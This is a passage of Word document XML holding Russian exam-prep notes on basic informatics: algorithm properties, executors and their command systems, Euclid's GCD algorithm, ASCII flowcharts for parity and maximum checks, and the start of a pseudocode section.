      </w:r>
      <w:r>
        <w:t xml:space="preserve"> числа. Поэтому строго говоря, это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>гипотеза</w:t>
      </w:r>
      <w:r>
        <w:t>, а не доказанный алгоритм.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Интересный момент:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Есть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>недетерминированные алгоритмы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (в теории сложности, например, NP-задачи). Там допускается "угадывание" решения. Но это специфика, на экзамене по базовой информатике не спрашивают.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Массовость (применимость к классу задач)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Массовость</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм должен решать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>не одну конкретную задачу</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, а </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>целый класс однотипных задач</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Алгоритм сложения двух чисел работает для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любых</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> двух чисел (5+3, 1000+2000, -7+15), а не только для конкретной пары "2 + 2 = 4".</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анти-пример (не массовый):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">"Ответ на вопрос 'сколько будет 2+2?' — это 4" — это не алгоритм, это просто </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>константа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Алгоритм должен уметь складывать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любые</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> два числа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правильная версия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Алгоритм сложения:</w:t>
        <w:br/>
        <w:t>1. Взять два числа a и b</w:t>
        <w:br/>
        <w:t>2. Вычислить c = a + b</w:t>
        <w:br/>
        <w:t>3. Вернуть c</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Теперь это работает для </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>любой</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> пары чисел → массовость есть.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Результативность (наличие результата)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Результативность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — алгоритм должен </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>давать результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (или сообщать, что решение невозможно). Нельзя, чтобы алгоритм завершился и ничего не выдал.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1 (есть результат):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Найти НОД(18, 24)</w:t>
        <w:br/>
        <w:t>Ответ: 6</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2 (результат = "решения нет"):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Найти целое число x, такое что x² = -1</w:t>
        <w:br/>
        <w:t>Ответ: Решения в целых числах не существует</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это тоже </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>результат</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (информация о невозможности решения).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анти-пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>"Подумай над задачей 5 минут" — через 5 минут ты можешь как найти решение, так и не найти. Нет гарантии результата → это не алгоритм.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Запоминалка: Д-Д-К-М-Р</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Д**искретность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Д**етерминированность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**К**онечность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**М**ассовость</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Р**езультативность</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>На экзамене могут спросить: "Назовите свойства алгоритма". Отвечаешь: "Д-Д-К-М-Р", расшифровываешь — и всё, вопрос закрыт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.3. Исполнитель алгоритма и СКИ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Исполнитель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Исполнитель алгоритма</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это тот, кто </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>выполняет</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> алгоритм. Это может быть:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Человек** (ты решаешь задачу по алгоритму)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Компьютер** (процессор выполняет машинный код)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Робот** (выполняет программу управления)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Виртуальная машина** (например, JVM для Java)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Система команд исполнителя (СКИ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>СКИ (Система Команд Исполнителя)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это набор </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>элементарных действий</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, которые исполнитель </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>умеет выполнять</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: СКИ человека</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Читать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Писать</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Считать в уме (сложение, вычитание, умножение, деление)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Запоминать числа</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: СКИ процессора (упрощённо)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Загрузить число из памяти в регистр (`MOV`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложить два числа (`ADD`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Вычесть (`SUB`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Умножить (`MUL`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Перейти на другую команду (`JMP`)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сравнить два числа (`CMP`)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: СКИ робота-пылесоса</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ехать вперёд</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Повернуть налево / направо</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Остановиться</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Всосать пыль</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Проверить наличие препятствия (датчик)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Важно:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Алгоритм должен быть записан </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>только</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> с использованием команд из СКИ. Если ты скажешь роботу-пылесосу "приготовь кофе", он тебя не поймёт — этой команды нет в его СКИ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример задачи:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Дан алгоритм для исполнителя "Калькулятор" с СКИ: {+, -, ×, ÷}.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Задача:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Вычислить \(5^3\) (5 в степени 3).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. 5 × 5 = 25</w:t>
        <w:br/>
        <w:t>2. 25 × 5 = 125</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Готово. Мы использовали только команды из СКИ (умножение).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Анти-пример:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> "Калькулятор, возведи 5 в степень 3" — если команды "возведение в степень" нет в СКИ, калькулятор не поймёт.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>5.1.4. Способы описания алгоритмов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Алгоритм можно описать разными способами. Выбор зависит от аудитории (для кого пишешь), задачи (насколько сложная) и этапа разработки (проектирование или реализация).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Словесный (текстовый) способ</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Описываешь алгоритм </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>на естественном языке</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (русском, английском). Как инструкцию для человека.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Понятно всем (не нужно знать программирование)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легко писать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нет строгости (можно понять по-разному)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Громоздко для сложных алгоритмов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Алгоритм заваривания чая</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Вскипятить воду</w:t>
        <w:br/>
        <w:t>2. Положить чайный пакетик в кружку</w:t>
        <w:br/>
        <w:t>3. Налить кипяток</w:t>
        <w:br/>
        <w:t>4. Подождать 3 минуты</w:t>
        <w:br/>
        <w:t>5. Вынуть пакетик</w:t>
        <w:br/>
        <w:t>6. Добавить сахар (по желанию)</w:t>
        <w:br/>
        <w:t>7. Готово</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Алгоритм нахождения НОД (наибольший общий делитель) двух чисел</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Взять два числа a и b</w:t>
        <w:br/>
        <w:t>2. Пока b ≠ 0:</w:t>
        <w:br/>
        <w:t xml:space="preserve">   2.1. Вычислить остаток от деления a на b, сохранить в r</w:t>
        <w:br/>
        <w:t xml:space="preserve">   2.2. Присвоить a = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">   2.3. Присвоить b = r</w:t>
        <w:br/>
        <w:t>3. Вернуть a (это и есть НОД)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>алгоритм Евклида</w:t>
      </w:r>
      <w:r>
        <w:t>. Работает быстро и точно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Блок-схема (графический способ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Идея:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Рисуешь алгоритм в виде </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>графа</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (диаграммы) из блоков, соединённых стрелками.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Основные блоки:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| Блок          | Обозначение          | Назначение                          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>| ------------- | -------------------- | ----------------------------------- |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Начало/Конец</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> | Овал ⬭           | Начало или конец алгоритма          |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Процесс</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Прямоугольник ▭   | Вычисление, операция (a = b + c)    |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Решение</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | Ромб ◇            | Условие (if-else), проверка         |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ввод/Вывод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Параллелограмм ▱  | Чтение или вывод данных             |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стрелки</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">      | →                 | Направление выполнения              |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 1: Блок-схема "Проверка числа на чётность"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">        ⬭ Начало</w:t>
        <w:br/>
        <w:t xml:space="preserve">          |</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ▱ Ввести число n</w:t>
        <w:br/>
        <w:t xml:space="preserve">          |</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ◇ n mod 2 = 0?</w:t>
        <w:br/>
        <w:t xml:space="preserve">      /       \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Да         Нет</w:t>
        <w:br/>
        <w:t xml:space="preserve">    /           \</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓             ↓</w:t>
        <w:br/>
        <w:t>▱ Вывести      ▱ Вывести</w:t>
        <w:br/>
        <w:t>"Чётное"      "Нечётное"</w:t>
        <w:br/>
        <w:t xml:space="preserve">   |             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓             ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ⬭ Конец      ⬭ Конец</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: Блок-схема "Найти максимум из двух чисел"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">        ⬭ Начало</w:t>
        <w:br/>
        <w:t xml:space="preserve">          |</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ▱ Ввести a и b</w:t>
        <w:br/>
        <w:t xml:space="preserve">          |</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ◇ a &gt; b?</w:t>
        <w:br/>
        <w:t xml:space="preserve">      /       \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    Да         Нет</w:t>
        <w:br/>
        <w:t xml:space="preserve">    /           \</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓             ↓</w:t>
        <w:br/>
        <w:t>▭ max = a     ▭ max = b</w:t>
        <w:br/>
        <w:t xml:space="preserve">   |             |</w:t>
        <w:br/>
        <w:t xml:space="preserve">   ↓             ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">    \           /</w:t>
        <w:br/>
        <w:t xml:space="preserve">     \         /</w:t>
        <w:br/>
        <w:t xml:space="preserve">      ↓       ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ▱ Вывести max</w:t>
        <w:br/>
        <w:t xml:space="preserve">          |</w:t>
        <w:br/>
        <w:t xml:space="preserve">          ↓</w:t>
        <w:br/>
        <w:t xml:space="preserve">        ⬭ Конец</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы блок-схем:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Наглядность (видно структуру алгоритма)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легко найти ошибки в логике</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Долго рисовать для сложных алгоритмов</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Занимает много места</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> На этапе </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>проектирования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (до написания кода). Рисуешь схему → проверяешь логику → пишешь код.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Псевдокод (алгоритмический язык)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Псевдокод</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это промежуточный язык между естественным языком и программированием. Похож на код, но не привязан к конкретному языку программирования.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правила:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Используем ключевые слова: `если`, `то`, `иначе`, `пока`, `для`, `вернуть`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Переменные обозначаем буквами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
